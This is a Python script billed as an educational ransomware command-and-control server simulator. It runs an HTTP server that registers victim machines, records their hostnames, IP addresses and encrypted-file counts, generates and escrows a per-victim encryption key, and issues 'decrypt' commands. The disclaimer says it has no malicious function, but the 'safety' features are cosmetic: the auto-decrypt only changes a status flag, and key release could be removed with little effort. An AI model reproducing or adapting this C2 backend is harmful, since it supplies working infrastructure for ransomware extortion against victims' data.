#!/usr/bin/env python3
"""
Ransomware Server Simulator - Educational Edition

This application simulates the server-side operations of ransomware
for cybersecurity education purposes. It demonstrates how C2 servers
might work without implementing any actual malicious functionality.

DISCLAIMER: This tool is for EDUCATIONAL PURPOSES ONLY.
Using this code for malicious purposes is ILLEGAL and UNETHICAL.
"""

import os
import sys
import json
import time
import base64
import logging
import argparse
import datetime
import threading
import http.server
import socketserver
from cryptography.fernet import Fernet

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("ransomware_server.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("RansomwareServer")

# Global variables
SERVER_DIR = os.path.join(os.path.expanduser("~"), "RansomwareServerSimulation")
CLIENTS_FILE = os.path.join(SERVER_DIR, "clients.json")
KEYS_FILE = os.path.join(SERVER_DIR, "encryption_keys.json")
DEFAULT_PORT = 8080

class RansomwareServerSimulator:
    """Educational simulator for ransomware C2 server operations."""

    def __init__(self):
        """Initialize the server simulator."""
        self.clients = {}
        self.encryption_keys = {}
        self.auto_decrypt_timers = {}
        
        # Ensure server directory exists
        os.makedirs(SERVER_DIR, exist_ok=True)
        
        # Load existing data
        self._load_data()

    def _load_data(self):
        """Load client and key data from files."""
        try:
            if os.path.exists(CLIENTS_FILE):
                with open(CLIENTS_FILE, 'r') as f:
                    self.clients = json.load(f)
                logger.info(f"Loaded {len(self.clients)} clients from file")
            
            if os.path.exists(KEYS_FILE):
                with open(KEYS_FILE, 'r') as f:
                    self.encryption_keys = json.load(f)
                logger.info(f"Loaded {len(self.encryption_keys)} encryption keys from file")
                
        except Exception as e:
            logger.error(f"Error loading data: {str(e)}")

    def _save_data(self):
        """Save client and key data to files."""
        try:
            with open(CLIENTS_FILE, 'w') as f:
                json.dump(self.clients, f, indent=4)
            
            with open(KEYS_FILE, 'w') as f:
                json.dump(self.encryption_keys, f, indent=4)
                
            logger.debug("Saved client and key data to files")
            
        except Exception as e:
            logger.error(f"Error saving data: {str(e)}")

    def register_client(self, client_id, client_info):
        """Register a new client in the simulation."""
        if client_id in self.clients:
            logger.info(f"Updating existing client: {client_id}")
        else:
            logger.info(f"Registering new client: {client_id}")
            
        # Generate new encryption key for this client
        key = Fernet.generate_key()
        key_str = key.decode('utf-8')
        
        # Store client info and key
        self.clients[client_id] = {
            "client_id": client_id,
            "registration_time": datetime.datetime.now().isoformat(),
            "last_check_in": datetime.datetime.now().isoformat(),
            "ip_address": client_info.get("ip_address", "unknown"),
            "hostname": client_info.get("hostname", "unknown"),
            "operating_system": client_info.get("operating_system", "unknown"),
            "status": "registered"
        }
        
        self.encryption_keys[client_id] = {
            "key": key_str,
            "creation_time": datetime.datetime.now().isoformat()
        }
        
        # Save the updated data
        self._save_data()
        
        return {
            "client_id": client_id,
            "status": "registered",
            "encryption_key": key_str
        }

    def update_client_status(self, client_id, status_info):
        """Update status for a client."""
        if client_id not in self.clients:
            logger.warning(f"Attempted to update unknown client: {client_id}")
            return {"error": "Client not found"}
            
        # Update the status
        self.clients[client_id].update({
            "last_check_in": datetime.datetime.now().isoformat(),
            "status": status_info.get("status", self.clients[client_id].get("status")),
            "encrypted_files": status_info.get("encrypted_files"),
            "target_directory": status_info.get("target_directory")
        })
        
        # If encryption was performed, schedule auto-decrypt
        if status_info.get("status") == "encrypted" and client_id not in self.auto_decrypt_timers:
            self._schedule_auto_decrypt(client_id)
        
        # Save the updated data
        self._save_data()
        
        return {
            "client_id": client_id,
            "status": "updated",
            "server_time": datetime.datetime.now().isoformat()
        }

    def get_client_status(self, client_id):
        """Get status information for a client."""
        if client_id not in self.clients:
            logger.warning(f"Attempted to query unknown client: {client_id}")
            return {"error": "Client not found"}
            
        # Update last check-in time
        self.clients[client_id]["last_check_in"] = datetime.datetime.now().isoformat()
        self._save_data()
        
        # Determine if auto-decrypt is scheduled
        auto_decrypt_info = None
        if client_id in self.auto_decrypt_timers:
            # Calculate time remaining
            encryption_time = datetime.datetime.fromisoformat(
                self.clients[client_id].get("encryption_time", datetime.datetime.now().isoformat())
            )
            auto_decrypt_time = encryption_time + datetime.timedelta(hours=24)
            time_remaining = auto_decrypt_time - datetime.datetime.now()
            
            auto_decrypt_info = {
                "scheduled_time": auto_decrypt_time.isoformat(),
                "hours_remaining": max(0, time_remaining.total_seconds() / 3600),
                "status": "pending" if time_remaining.total_seconds() > 0 else "triggered"
            }
        
        return {
            "client_id": client_id,
            "status": self.clients[client_id].get("status", "unknown"),
            "last_check_in": self.clients[client_id].get("last_check_in"),
            "auto_decrypt": auto_decrypt_info,
            "command": "decrypt" if auto_decrypt_info and auto_decrypt_info["status"] == "triggered" else None
        }

    def get_decryption_key(self, client_id):
        """Get the decryption key for a client."""
        if client_id not in self.encryption_keys:
            logger.warning(f"Attempted to get key for unknown client: {client_id}")
            return {"error": "Client not found"}
            
        # In a real attack, this would only happen after ransom payment
        # For educational purposes, we provide the key immediately
        
        return {
            "client_id": client_id,
            "decryption_key": self.encryption_keys[client_id]["key"],
            "status": "key_provided"
        }

    def list_clients(self):
        """List all registered clients."""
        client_list = []
        
        for client_id, info in self.clients.items():
            # Calculate time since last check-in
            try:
                last_check_in = datetime.datetime.fromisoformat(info.get("last_check_in"))
                time_since = datetime.datetime.now() - last_check_in
                hours_since = time_since.total_seconds() / 3600
            except:
                hours_since = 0
                
            client_list.append({
                "client_id": client_id,
                "status": info.get("status", "unknown"),
                "hours_since_check_in": round(hours_since, 2),
                "encrypted_files": info.get("encrypted_files", 0),
                "hostname": info.get("hostname", "unknown")
            })
            
        return client_list

    def _schedule_auto_decrypt(self, client_id):
        """Schedule automatic decryption for a client after 24 hours."""
        logger.info(f"Scheduling auto-decrypt for client {client_id} in 24 hours")
        
        # Store encryption time
        self.clients[client_id]["encryption_time"] = datetime.datetime.now().isoformat()
        self._save_data()
        
        # In a real attack, this wouldn't exist, but we add it as a safety feature
        def auto_decrypt_job():
            logger.info(f"Auto-decrypt timer triggered for client {client_id}")
            self.clients[client_id]["status"] = "auto_decrypted"
            self.clients[client_id]["auto_decrypt_triggered"] = datetime.datetime.now().isoformat()
            self._save_data()
            
            # Remove this timer from the dictionary
            self.auto_decrypt_timers.pop(client_id, None)
        
        # Schedule the job
        timer = threading.Timer(24 * 3600, auto_decrypt_job)  # 24 hours
        timer.daemon = True
        timer.start()
        
        # Store the timer
        self.auto_decrypt_timers[client_id] = timer

class RequestHandler(http.server.BaseHTTPRequestHandler):
    """HTTP request handler for ransomware server simulator."""
    
    def _send_response(self, data, status=200):
        """Send a JSON response with the given status code."""
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode('utf-8'))
    
    def do_GET(self):
        """Handle GET requests."""
        server = self.server.simulator
        
        # Parse the path
        path_parts = self.path.strip('/').split('/')
        
        if self.path == '/':
            # Server info page
            self._send_response({
                "info": "Ransomware Server Simulator - EDUCATIONAL PURPOSES ONLY",
                "warning": "This is a simulation for cybersecurity education",
                "endpoints": [
                    "/clients",
                    "/client/{client_id}",
                    "/key/{client_id}"
                ]
            })
        elif self.path == '/clients':
            # List all clients
            self._send_response({
                "clients": server.list_clients(),
                "count": len(server.clients)
            })
        elif len(path_parts) >= 2 and path_parts[0] == 'client':
            # Get client status
            client_id = path_parts[1]
            self._send_response(server.get_client_status(client_id))
        elif len(path_parts) >= 2 and path_parts[0] == 'key':
            # Get decryption key
            client_id = path_parts[1]
            self._send_response(server.get_decryption_key(client_id))
        else:
            # Unknown endpoint
            self._send_response({"error": "Not found"}, 404)
    
    def do_POST(self):
        """Handle POST requests."""
        server = self.server.simulator
        
        # Parse the path and read the data
        path_parts = self.path.strip('/').split('/')
        content_length = int(self.headers.get('Content-Length', 0))
        
        try:
            if content_length > 0:
                body = self.rfile.read(content_length)
                data = json.loads(body.decode('utf-8'))
            else:
                data = {}
        except json.JSONDecodeError:
            self._send_response({"error": "Invalid JSON"}, 400)
            return
        
        if len(path_parts) >= 2 and path_parts[0] == 'register':
            # Register a new client
            client_id = path_parts[1]
            self._send_response(server.register_client(client_id, data))
        elif len(path_parts) >= 2 and path_parts[0] == 'status':
            # Update client status
            client_id = path_parts[1]
            self._send_response(server.update_client_status(client_id, data))
        else:
            # Unknown endpoint
            self._send_response({"error": "Not found"}, 404)
    
    def log_message(self, format, *args):
        """Custom log message to avoid cluttering the console."""
        logger.debug(format % args)

class SimulationServer(socketserver.TCPServer):
    """TCP server that holds a reference to the simulator."""
    
    def __init__(self, server_address, RequestHandlerClass, simulator):
        self.simulator = simulator
        super().__init__(server_address, RequestHandlerClass)

def print_disclaimer():
    """Print the educational disclaimer."""
    disclaimer = """
========================================================
  EDUCATIONAL RANSOMWARE SERVER SIMULATION - DISCLAIMER
========================================================

This application is for EDUCATIONAL PURPOSES ONLY.

It simulates the server-side operations of ransomware 
for cybersecurity professionals to understand how these
attacks are coordinated.

THIS TOOL:
- Does not implement any actual malicious functionality
- Contains safety features like automatic decryption
- Is intended for controlled environments only

USING THIS SOFTWARE FOR MALICIOUS PURPOSES IS:
1. ILLEGAL - Unauthorized access and extortion are crimes
2. UNETHICAL - Causing harm to others is wrong
3. AGAINST THE PURPOSE OF THIS EDUCATIONAL TOOL

By using this software, you agree to use it responsibly
and ethically for educational purposes only.

========================================================
"""
    print(disclaimer)
    confirmation = input("Do you understand and agree to use this tool for educational purposes only? (yes/no): ")
    if confirmation.lower() not in ["yes", "y"]:
        print("Exiting application. Agreement required to continue.")
        sys.exit(0)

def start_server(port):
    """Start the HTTP server."""
    simulator = RansomwareServerSimulator()
    
    try:
        server = SimulationServer(("0.0.0.0", port), RequestHandler, simulator)
        print(f"Server started on port {port}")
        print("Press Ctrl+C to stop")
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down server")
    except OSError as e:
        if e.errno == 98:  # Address already in use
            print(f"Error: Port {port} is already in use")
        else:
            print(f"Error: {str(e)}")
    finally:
        if 'server' in locals():
            server.server_close()

def interactive_mode(simulator):
    """Run the simulator in interactive command-line mode."""
    while True:
        print("\n=== Ransomware Server Simulator (Educational) ===")
        print("1. List all clients")
        print("2. View client details")
        print("3. Get decryption key for client")
        print("4. Start HTTP server")
        print("5. Exit")
        
        choice = input("\nEnter choice (1-5): ")
        
        if choice == "1":
            clients = simulator.list_clients()
            
            print("\nRegistered Clients:")
            print("-" * 80)
            print(f"{'CLIENT ID':<15} {'STATUS':<15} {'HOSTNAME':<20} {'FILES':<8} {'LAST SEEN (hrs)'}")
            print("-" * 80)
            
            for client in clients:
                print(f"{client['client_id']:<15} {client['status']:<15} {client['hostname']:<20} {client['encrypted_files']:<8} {client['hours_since_check_in']}")
                
            if not clients:
                print("No clients registered")
                
        elif choice == "2":
            client_id = input("Enter client ID: ")
            status = simulator.get_client_status(client_id)
            
            if "error" in status:
                print(f"Error: {status['error']}")
            else:
                print("\nClient Details:")
                for key, value in status.items():
                    print(f"  {key}: {value}")
                    
        elif choice == "3":
            client_id = input("Enter client ID: ")
            key_info = simulator.get_decryption_key(client_id)
            
            if "error" in key_info:
                print(f"Error: {key_info['error']}")
            else:
                print("\nDecryption Key:")
                print(key_info["decryption_key"])
                
        elif choice == "4":
            try:
                port = int(input("Enter port (default: 8080): ") or DEFAULT_PORT)
                start_server(port)
            except ValueError:
                print("Invalid port number")
                
        elif choice == "5":
            print("Exiting. Thank you for using the educational simulator.")
            break
            
        else:
            print("Invalid choice. Please enter a number between 1 and 5.")

def main():
    """Main entry point for the application."""
    parser = argparse.ArgumentParser(description="Ransomware Server Simulator (For Educational Purposes Only)")
    parser.add_argument("--port", "-p", type=int, default=DEFAULT_PORT, help=f"Port to listen on (default: {DEFAULT_PORT})")
    parser.add_argument("--interactive", "-i", action="store_true", help="Run in interactive mode")
    
    args = parser.parse_args()
    
    print_disclaimer()
    
    # Create simulator instance
    simulator = RansomwareServerSimulator()
    
    # Run in interactive mode or start the server directly
    if args.interactive:
        interactive_mode(simulator)
    else:
        start_server(args.port)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nOperation cancelled by user.")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Unhandled exception: {str(e)}")
        print(f"Error: {str(e)}")
        sys.exit(1)